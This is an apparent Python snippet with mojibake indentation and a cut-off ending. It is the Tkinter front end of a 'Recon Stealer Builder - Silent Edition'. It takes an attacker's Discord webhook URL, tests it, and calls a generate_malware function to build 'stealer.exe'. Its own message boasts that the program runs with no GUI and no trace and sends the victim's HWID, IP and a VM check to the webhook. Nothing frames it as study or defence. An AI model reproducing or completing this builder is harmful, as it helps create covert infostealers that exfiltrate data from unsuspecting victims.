def get_webhook():
Â Â Â Â root = tk.Tk()
Â Â Â Â root.title("Recon Stealer Builder - Silent Edition")
Â Â Â Â root.geometry("600x280")
Â Â Â Â root.resizable(False, False)
Â Â Â Â tk.Label(root, text="Discord Webhook URL:", font=("Arial", 11)).pack(pady=15)
Â Â Â Â webhook_entry = tk.Entry(root, width=80)
Â Â Â Â webhook_entry.pack(pady=5)
Â Â Â Â def run_test():
Â Â Â Â Â Â Â Â hook = webhook_entry.get().strip()
Â Â Â Â Â Â Â Â success, msg = test_webhook(hook)
Â Â Â Â Â Â Â Â if success:
Â Â Â Â Â Â Â Â Â Â Â Â messagebox.showinfo("OK", msg)
Â Â Â Â Â Â Â Â else:
Â Â Â Â Â Â Â Â Â Â Â Â messagebox.showerror("Failed", msg)
Â Â Â Â tk.Button(root, text="TEST WEBHOOK", command=run_test, bg="#5865F2", fg="white", font=("Arial", 10, "bold")).pack(pady=10)
Â Â Â Â progress = ttk.Progressbar(root, mode="indeterminate")
Â Â Â Â def build():
Â Â Â Â Â Â Â Â webhook = webhook_entry.get().strip()
Â Â Â Â Â Â Â Â if not webhook or "discord.com/api/webhooks" not in webhook:
Â Â Â Â Â Â Â Â Â Â Â Â messagebox.showerror("Nope", "Valid webhook required.")
Â Â Â Â Â Â Â Â Â Â Â Â return
Â Â Â Â Â Â Â Â progress.pack(pady=15)
Â Â Â Â Â Â Â Â progress.start()
Â Â Â Â Â Â Â Â root.update()
Â Â Â Â Â Â Â Â try:
Â Â Â Â Â Â Â Â Â Â Â Â generate_malware(webhook)
Â Â Â Â Â Â Â Â Â Â Â Â progress.stop()
Â Â Â Â Â Â Â Â Â Â Â Â progress.pack_forget()
Â Â Â Â Â Â Â Â Â Â Â Â messagebox.showinfo("Built", "stealer.exe ready.\n100% silent - no GUI, no trace.\nSends basic recon (HWID, IP, VM check) as file.")
Â Â Â Â Â Â Â Â except Exception as e:
Â Â Â Â Â Â Â Â Â Â Â Â progress.stop()
